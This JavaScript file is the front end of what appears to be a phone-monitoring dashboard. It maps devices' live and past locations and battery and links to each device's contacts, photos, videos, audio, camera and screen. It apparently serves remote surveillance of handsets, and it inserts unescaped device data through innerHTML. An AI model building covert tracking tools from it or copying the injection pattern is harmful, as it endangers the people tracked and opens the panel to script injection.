let map;
let marker = null;
let devices = [];
let selectedDeviceId = null;
let startMarker = null;
let endMarker = null;
let showAllDevicesOnMap = false;
let allMarkers = [];

function toggleAllDevices() {

    showAllDevicesOnMap =
        document.getElementById("showAllSwitch").checked;

    if (showAllDevicesOnMap) {

        drawAllMarkers();

    } else {

        const device =
            devices.find(d => d.id === selectedDeviceId);

        if (device) {

            updateMap(device);

        }

    }

}

function drawAllMarkers() {

    clearAllMarkers();

    const bounds = [];

    devices.forEach(device => {

        if (
            device.latitude == null ||
            device.longitude == null
        ) {
            return;
        }

        const marker = L.marker([
            device.latitude,
            device.longitude
        ]).addTo(map);

        marker.bindPopup(`
              <b>${device.username}</b><br>
        
              📱 ${device.deviceModel}<br>
          
              🔋 Battery :
              ${device.battery ?? "-"}%<br>
          
              ${isOnline(device.lastOnline)
                ? "🟢 Online"
                : "🔴 Offline"}
           `);

        marker.bindTooltip(

            device.username.length > 10
                ? device.username.substring(0, 10) + "..."
                : device.username,

            {
                permanent: true,
                direction: "top",
                offset: [0, -15],
                className: "device-label"
            }

        );

        marker.on("click", () => {

            document.getElementById("showAllSwitch").checked = false;

            showAllDevicesOnMap = false;

            showDevice(device);

        });

        allMarkers.push(marker);

        bounds.push([
            device.latitude,
            device.longitude
        ]);

    });

    if (bounds.length > 0) {

        map.fitBounds(bounds, {

            padding: [40, 40]

        });

    }

}

function clearAllMarkers() {

    allMarkers.forEach(marker => {

        map.removeLayer(marker);

    });

    allMarkers = [];

}

function initMap() {

    map = L.map("map").setView([28.6139, 77.2090], 5);

    L.tileLayer(
        "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
        {
            attribution: "&copy; OpenStreetMap Contributors"
        }
    ).addTo(map);

    loadDevices();

    setInterval(loadDevices, 10000);

    document
        .getElementById("searchDevice")
        .addEventListener("keyup", filterDevices);

}

let expanded = false;

function toggleMap() {

    const mapDiv = document.getElementById("map");
    const btn = event.target;

    if (expanded) {
        mapDiv.style.height = "450px";
        btn.innerHTML = "Expand";
    } else {
        mapDiv.style.height = "700px";
        btn.innerHTML = "Collapse";
    }

    expanded = !expanded;

    setTimeout(() => {
        map.invalidateSize();
    }, 200);

}

async function updateTracking() {

    if (selectedDeviceId == null) {
        return;
    }

    const device =
        devices.find(d => d.id === selectedDeviceId);

    if (!device) {
        return;
    }

    const body = {

        deviceId: device.deviceId,

        trackingEnabled:
            document.getElementById("trackingSwitch").checked,

        trackingInterval:
            Number(
                document.getElementById("trackingInterval").value
            )

    };

    try {

        const response =
            await fetch("/api/device/tracking", {

                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify(body)

            });

        const result =
            await response.json();

        if (result.success) {

            device.trackingEnabled =
                body.trackingEnabled;

            device.trackingInterval =
                body.trackingInterval;

            alert("Tracking Updated Successfully");

        } else {

            alert(result.message);

        }

    } catch (e) {

        console.log(e);

        alert("Server Error");

    }

}

async function loadDevices() {

    try {

        const response = await fetch("/api/device/all");

        const result = await response.json();

        if (!result.success) return;

        devices = result.data || [];

        devices.sort((a, b) => {

            if (isOnline(a.lastOnline) && !isOnline(b.lastOnline))
                return -1;

            if (!isOnline(a.lastOnline) && isOnline(b.lastOnline))
                return 1;

            return a.username.localeCompare(b.username);

        });

        updateCards();

        renderTable(devices);

        if (devices.length === 0) return;

        if (selectedDeviceId == null) {

            showDevice(devices[0]);

        } else {

            const device = devices.find(d => d.id === selectedDeviceId);

            if (device) {

                updateSelectedDevice(device);

            }

        }

    } catch (e) {

        console.error(e);

    }
    if (showAllDevicesOnMap) {

        drawAllMarkers();

    }

}

function renderTable(list) {

    const tbody = document.getElementById("deviceTable");

    tbody.innerHTML = "";

    list.forEach(device => {

        tbody.innerHTML += `

        <tr
           id="row-${device.id}"
           style="cursor:pointer"
           onclick="showDeviceById(${device.id})">

            <td>

                <strong>${device.username}</strong><br>

                <small class="text-muted">
                    ${device.deviceModel}
                </small>

            </td>

            <td>

                ${device.battery != null ? device.battery + "%" : "-"}

            </td>

            <td>

            ${isOnline(device.lastOnline)

                ?

                '<span class="badge bg-success"><i class="bi bi-wifi"></i> Online</span>'

                :

                '<span class="badge bg-danger"><i class="bi bi-wifi-off"></i> Offline</span>'

            }

            </td>

        </tr>

        `;

    });

    highlightSelectedRow();

}

function highlightSelectedRow() {

    document.querySelectorAll("#deviceTable tr").forEach(r => {
        r.classList.remove("selected-row");
    });

    if (selectedDeviceId != null) {

        const row = document.getElementById("row-" + selectedDeviceId);

        if (row) {

            row.classList.add("selected-row");

        }

    }

}

function showDeviceById(id) {

    const device = devices.find(d => d.id === id);

    if (device) {

        showDevice(device);

    }

}

function showDevice(device) {

    selectedDeviceId = device.id;

    highlightSelectedRow();

    document.getElementById("username").innerHTML =
        device.username || "-";

    document.getElementById("trackingUsername").innerHTML =
        device.username || "-";

    document.getElementById("deviceModel").innerHTML =
        device.deviceModel || "-";

    document.getElementById("battery").innerHTML =
        device.battery != null
            ? device.battery + "%"
            : "-";

    document.getElementById("lastOnline").innerHTML =
        device.lastOnline || "-";

    document.getElementById("address").innerHTML =
        device.address || "Address Not Available";

    document.getElementById("latitude").innerHTML =
        device.latitude ?? "-";

    document.getElementById("longitude").innerHTML =
        device.longitude ?? "-";

    document.getElementById("trackingSwitch").checked =
        device.trackingEnabled ?? false;

    document.getElementById("trackingInterval").value =
        device.trackingInterval ?? 60;

    const badge = document.getElementById("statusBadge");

    if (isOnline(device.lastOnline)) {

        badge.className = "badge bg-success";

        badge.innerHTML = "Online";

    } else {

        badge.className = "badge bg-danger";

        badge.innerHTML = "Offline";

    }

    updateMap(device);
    loadHistory(device.deviceId);

}

function updateSelectedDevice(device) {

    selectedDeviceId = device.id;

    document.getElementById("username").innerHTML =
        device.username || "-";

    document.getElementById("trackingUsername").innerHTML =
        device.username || "-";

    document.getElementById("deviceModel").innerHTML =
        device.deviceModel || "-";

    document.getElementById("battery").innerHTML =
        device.battery != null
            ? device.battery + "%"
            : "-";

    document.getElementById("lastOnline").innerHTML =
        device.lastOnline || "-";

    document.getElementById("address").innerHTML =
        device.address || "Address Not Available";

    document.getElementById("latitude").innerHTML =
        device.latitude ?? "-";

    document.getElementById("longitude").innerHTML =
        device.longitude ?? "-";

    document.getElementById("trackingSwitch").checked =
        device.trackingEnabled ?? false;

    document.getElementById("trackingInterval").value =
        device.trackingInterval ?? 60;

    const badge =
        document.getElementById("statusBadge");

    if (isOnline(device.lastOnline)) {

        badge.className = "badge bg-success";
        badge.innerHTML = "Online";

    } else {

        badge.className = "badge bg-danger";
        badge.innerHTML = "Offline";

    }

    highlightSelectedRow();

    if (!showAllDevicesOnMap) {

        updateMap(device);

    }

    loadHistory(device.deviceId);

}

function updateMap(device) {

    clearAllMarkers();

    if (device.latitude == null || device.longitude == null) {
        if (routeLine) {

            map.removeLayer(routeLine);

            routeLine = null;

        }

        if (startMarker) {

            map.removeLayer(startMarker);

            startMarker = null;

        }

        if (endMarker) {

            map.removeLayer(endMarker);

            endMarker = null;

        }

        if (marker) {

            map.removeLayer(marker);

            marker = null;

        }

        map.setView([28.6139, 77.2090], 5);

        return;

    }

    if (marker != null) {

        map.removeLayer(marker);

    }

    marker = L.marker([
        device.latitude,
        device.longitude
    ]).addTo(map);

    marker.bindPopup(`

         <div style="min-width:220px">
         
         <h6>${device.username}</h6>
         
         <hr>
         
         <b>Battery :</b> ${device.battery}%<br>
         
         <b>Status :</b>
         
         ${isOnline(device.lastOnline)
            ? "🟢 Online"
            : "🔴 Offline"}
         
         <br>
         
         <b>Address :</b>
         
         ${device.address}
         
         </div>
         
     `);

}

function updateCards() {

    document.getElementById("totalDevices").innerHTML =
        devices.length;

    let online = 0;
    let battery = 0;
    let batteryCount = 0;

    devices.forEach(device => {

        if (isOnline(device.lastOnline)) {

            online++;

        }

        if (device.battery != null) {

            battery += device.battery;

            batteryCount++;

        }

    });

    document.getElementById("onlineDevices").innerHTML =
        online;

    document.getElementById("offlineDevices").innerHTML =
        devices.length - online;

    document.getElementById("avgBattery").innerHTML =
        batteryCount === 0
            ? "0%"
            : Math.round(battery / batteryCount) + "%";

}

function filterDevices() {

    const keyword = this.value.toLowerCase();

    const filtered = devices.filter(device =>

        (device.username || "")
            .toLowerCase()
            .includes(keyword)

        ||

        (device.deviceModel || "")
            .toLowerCase()
            .includes(keyword)

    );

    renderTable(filtered);

}

function isOnline(lastOnline) {

    if (!lastOnline) {

        return false;

    }

    const diff =
        (Date.now() - new Date(lastOnline).getTime())
        / 1000;

    return diff < 300; // 5 Minutes

}

async function loadHistory(deviceId) {

    try {

        const response = await fetch("/api/device/history/" + deviceId);

        const result = await response.json();

        if (result.success && result.data) {
            drawRoute(result.data);
        }

    } catch (e) {

        console.log(e);

    }

}

let routeLine;

function drawRoute(history) {

    if (routeLine) {
        map.removeLayer(routeLine);
        routeLine = null;
    }

    if (startMarker) {
        map.removeLayer(startMarker);
        startMarker = null;
    }

    if (endMarker) {
        map.removeLayer(endMarker);
        endMarker = null;
    }

    if (!history || history.length == 0) {

        return;

    }

    const points = [];

    history.forEach(item => {

        if (item.latitude != null && item.longitude != null) {

            points.push([

                item.latitude,

                item.longitude

            ]);

        }

    });

    if (points.length == 0) {

        return;

    }

    const startIcon = L.icon({

        iconUrl:
            "https://maps.google.com/mapfiles/ms/icons/green-dot.png",

        iconSize: [35, 35]

    });

    const endIcon = L.icon({

        iconUrl:
            "https://maps.google.com/mapfiles/ms/icons/red-dot.png",

        iconSize: [35, 35]

    });

    startMarker =
        L.marker(points[0], {
            icon: startIcon
        }).addTo(map);

    endMarker =
        L.marker(
            points[points.length - 1],
            {
                icon: endIcon
            }).addTo(map);

    startMarker.bindPopup("Start");
    endMarker.bindPopup("Current");

    if (points.length > 1) {

        routeLine = L.polyline(points, {

            color: "#0d6efd",

            weight: 6,

            opacity: 0.8

        }).addTo(map);

        map.fitBounds(routeLine.getBounds(), {
            padding: [40, 40]
        });

    } else {

        map.setView(points[0], 16);

    }

    const tbody =
        document.getElementById("historyTable");

    tbody.innerHTML = "";

    history.forEach((item, index) => {

        tbody.innerHTML += `

       <tr>
   
           <td>${index + 1}</td>
   
           <td>${item.latitude ?? "-"}</td>
   
           <td>${item.longitude ?? "-"}</td>
   
           <td>${item.battery != null ? item.battery + "%" : "-"}</td>
   
           <td title="${item.address ?? "-"}">${(item.address ?? "-").length > 80
                ? item.address.substring(0, 80) + "..."
                : (item.address ?? "-")}
           </td>
   
           <td>${formatDate(item.createdAt)}</td>
   
       </tr>

    `;

    });

}

function formatDate(date) {

    if (!date) {
        return "-";
    }

    return new Date(date).toLocaleString("en-IN", {

        day: "2-digit",
        month: "short",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"

    });

}

function openContacts() {

    if (selectedDeviceId == null)
        return;

    const device =
        devices.find(d => d.id === selectedDeviceId);

    if (!device)
        return;

    window.location.href =
        "/contacts.html?deviceId=" + device.deviceId;

}

function openImages() {

    if (selectedDeviceId == null)
        return;

    const device =
        devices.find(d => d.id === selectedDeviceId);

    if (!device)
        return;

    window.location.href =
        "/images.html?deviceId=" + device.deviceId;

}

function viewVideos() {

    if (!selectedDeviceId) {

        alert("Select Device First");

        return;

    }

    const device = devices.find(d => d.id === selectedDeviceId);

    window.location.href =
        "/videos.html?deviceId=" + device.deviceId;

}

function viewAudios() {

    if (!selectedDeviceId) {

        alert("Select Device First");

        return;

    }

    const device = devices.find(d => d.id === selectedDeviceId);

    window.location.href =
        "/audios.html?deviceId=" + device.deviceId;

}


function openCamera() {

    if (selectedDeviceId == null) {
        alert("Select Device");
        return;
    }

    const device = devices.find(d => d.id === selectedDeviceId);

    if (!device) {
        alert("Device not found");
        return;
    }

    console.log(device);

    location.href =
        "/camera.html?deviceId=" + device.deviceId;
}

function openScreen() {

    if (selectedDeviceId == null) {

        alert("Select Device");
        return;

    }

    const device = devices.find(d => d.id === selectedDeviceId);

    if (!device) {

        alert("Device not found");
        return;

    }

    console.log(device);

    location.href =
        "/screen.html?deviceId=" + device.deviceId;

}

window.onload = initMap;